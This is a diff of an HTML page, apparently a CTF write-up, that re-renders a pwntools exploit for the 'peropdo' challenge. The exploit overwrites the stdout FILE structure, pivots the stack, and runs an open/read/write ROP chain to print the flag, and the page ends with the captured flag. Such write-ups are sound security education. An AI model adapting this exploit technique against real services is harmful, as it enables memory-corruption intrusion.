@@ -305,84 +305,83 @@ call    do_main
   <li>Since it’s a static linked binary, it’s easy for us to find some gadgets and do the <strong>open/read/write</strong> syscall, making the service print out the flag of the challenge. (The <strong>execve</strong> syscall seems to be filtered out in this challenge)</li>
 </ol>
 
-<p>Final exploit:<br />
-```python exp_peropdo.py 
-#!/usr/bin/env python</p>
+<p>Final exploit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me”
-PORT = 80
-ELF_PATH = “./peropdo”</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./peropdo"</span>
 
-<p>context.binary = ELF_PATH
-context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
-context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach</p>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c"># for gdb.attach</span>
 
-<p>elf = context.binary # context.binary is an ELF object</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c"># context.binary is an ELF object</span>
 
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
-#r = process(ELF_PATH)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
+    
+    <span class="c">#gdb.attach(r, gdbscript=open("./ggg", "r"))</span>
+    <span class="n">func</span> <span class="o">=</span> <span class="mh">0x0806d7aa</span> <span class="c"># avoid crash</span>
+    <span class="n">scanf</span> <span class="o">=</span> <span class="mh">0x08048b2a</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">scanf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x42</span><span class="s">"</span><span class="o">*</span><span class="mi">972</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80ecdf4</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">92</span>  <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80ecdf8</span><span class="p">)</span> 
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name?"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
-#gdb.attach(r, gdbscript=open("./ggg", "r"))
-func = 0x0806d7aa # avoid crash
-scanf = 0x08048b2a
-name = p32(scanf) + p32(func) + "\x42"*972 + p32(0x80ecdf4) + '\x00'*92  + p32(0x80ecdf8) 
-r.sendlineafter("name?", name)
+    <span class="c"># Later the program will call scanf("%s", stdout);</span>
+    <span class="c"># now we can overwrite the whole stdout FILE structure</span>
 
-# Later the program will call scanf("%s", stdout);
-# now we can overwrite the whole stdout FILE structure
+    <span class="n">stream</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08079824</span><span class="p">)</span> <span class="c"># second gadget: add esp, 0x84....</span>
+    <span class="n">stream</span> <span class="o">+=</span> <span class="s">"/home/peropdo/flag</span><span class="se">\x00</span><span class="s">"</span> <span class="c"># flag path</span>
+    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804b45c</span><span class="p">)</span> <span class="c"># eip, first gadget: xchg esp, eax ; ret</span>
+    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080ED3E8</span><span class="p">)</span> <span class="c"># pointer to null</span>
+    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x807982b</span><span class="p">)</span> <span class="c"># third gadget: pop; ret</span>
+    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80eb2a0</span><span class="p">)</span> <span class="c"># fake jump table</span>
+    
+    <span class="c"># 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret </span>
+    <span class="c"># 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span>
+    <span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x806f322</span>  <span class="c"># pop ebx;ret</span>
+    <span class="n">pop_eax</span> <span class="o">=</span> <span class="mh">0x80e3525</span>  <span class="c"># pop eax;ret</span>
+    <span class="n">pop_ecx</span> <span class="o">=</span> <span class="mh">0x080e5ee1</span> <span class="c"># pop ecx ; ret </span>
+    <span class="n">pop_edx</span> <span class="o">=</span> <span class="mh">0x0806f2fa</span> <span class="c"># pop edx ; ret</span>
+    <span class="n">int80</span> <span class="o">=</span> <span class="mh">0x806fae0</span>    <span class="c"># int 0x80 ; ret </span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="mh">0x80ed000</span><span class="o">-</span><span class="mh">0x100</span>
+    <span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+                <span class="n">pop_ecx</span><span class="p">,</span>
+                <span class="mi">0</span><span class="p">,</span>
+                <span class="n">pop_edx</span><span class="p">,</span> 
+                <span class="mi">0</span><span class="p">,</span>
+                <span class="mh">0x08074f2e</span><span class="p">,</span> <span class="c"># mov eax = 5 (open), pop ebx...</span>
+                <span class="mh">0x80eb2a4</span><span class="p">,</span> <span class="c"># ptr to flag path</span>
+                <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],</span>
+                <span class="n">int80</span><span class="p">,</span>              
+                <span class="n">pop_eax</span><span class="p">,</span>
+                <span class="mi">3</span><span class="p">,</span> <span class="c"># read</span>
+                <span class="n">pop_ebx</span><span class="p">,</span>
+                <span class="mi">3</span><span class="p">,</span> <span class="c">#fd</span>
+                <span class="n">pop_ecx</span><span class="p">,</span>
+                <span class="n">buf</span><span class="p">,</span>
+                <span class="n">pop_edx</span><span class="p">,</span>
+                <span class="mh">0x100</span><span class="p">,</span>
+                <span class="n">int80</span><span class="p">,</span>
+                <span class="n">pop_ebx</span><span class="p">,</span>
+                <span class="mi">1</span><span class="p">,</span> <span class="c"># fd,</span>
+                <span class="n">pop_eax</span><span class="p">,</span>
+                <span class="mi">4</span><span class="p">,</span> <span class="c"># write</span>
+                <span class="n">int80</span>
+              <span class="p">)</span>
 
-stream = p32(0x08079824) # second gadget: add esp, 0x84....
-stream += "/home/peropdo/flag\x00" # flag path
-stream = stream.ljust(0x1c, '\0')
-stream += p32(0x804b45c) # eip, first gadget: xchg esp, eax ; ret
-stream = stream.ljust(0x48, '\0')
-stream += p32(0x080ED3E8) # pointer to null
-stream = stream.ljust(0x90, '\0')
-stream += p32(0x807982b) # third gadget: pop; ret
-stream += p32(0x80eb2a0) # fake jump table
-
-# 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 
-# 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-pop_ebx = 0x806f322  # pop ebx;ret
-pop_eax = 0x80e3525  # pop eax;ret
-pop_ecx = 0x080e5ee1 # pop ecx ; ret 
-pop_edx = 0x0806f2fa # pop edx ; ret
-int80 = 0x806fae0    # int 0x80 ; ret 
-buf = 0x80ed000-0x100
-rop = flat(
-            pop_ecx,
-            0,
-            pop_edx, 
-            0,
-            0x08074f2e, # mov eax = 5 (open), pop ebx...
-            0x80eb2a4, # ptr to flag path
-            [0,0,0],
-            int80,              
-            pop_eax,
-            3, # read
-            pop_ebx,
-            3, #fd
-            pop_ecx,
-            buf,
-            pop_edx,
-            0x100,
-            int80,
-            pop_ebx,
-            1, # fd,
-            pop_eax,
-            4, # write
-            int80
-          )
-
-r.sendline(stream + rop)
-r.interactive() ```
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">stream</span> <span class="o">+</span> <span class="n">rop</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>flag: <code class="highlighter-rouge">Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc</code></p>
